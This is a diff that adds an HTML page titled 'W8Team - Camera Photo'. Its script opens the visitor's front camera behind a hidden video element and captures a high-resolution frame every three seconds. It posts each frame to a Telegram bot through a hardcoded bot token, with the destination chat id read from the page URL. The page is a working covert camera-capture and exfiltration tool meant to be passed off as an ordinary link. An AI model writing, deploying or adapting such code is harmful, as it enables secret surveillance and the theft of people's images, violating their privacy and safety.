@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8Team - Camera Photo</title>
+    <style>
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>
+
+    <script>
+        const botToken = "9087217791:AAEjOhKH0uOml0VcW8Vsw2whkm0ZX6cOSvY";
+        let chatId = getChatIdFromUrl();
+
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+
+        function sendTextToTelegram(message) {
+            const params = new URLSearchParams({
+                chat_id: chatId,
+                text: message
+            });
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?${params}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        }
+
+        function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("photo", blob, "camera_hd.jpg");
+            formData.append("chat_id", chatId);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        }
+
+        function startCamera() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+
+            const constraints = {
+                video: {
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 },
+                    facingMode: "user"
+                }
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    // First capture as soon as video is ready
+                    video.onloadedmetadata = () => {
+                        captureAndSend();
+                        // Then capture every 3 seconds
+                        setInterval(captureAndSend, 3000);
+                    };
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to access camera.");
+                });
+
+            function captureAndSend() {
+                try {
+                    // Draw HD frame to canvas
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // High quality JPEG (0.9)
+                    canvas.toBlob(blob => {
+                        if (blob && blob.size > 0) {
+                            sendPhotoToTelegram(blob);
+                        }
+                    }, "image/jpeg", 0.9);
+                } catch (e) {
+                    console.error(e);
+                }
+            }
+        }
+
+        // Start on page load
+        startCamera();
+    </script>
+</body>
+</html>
+
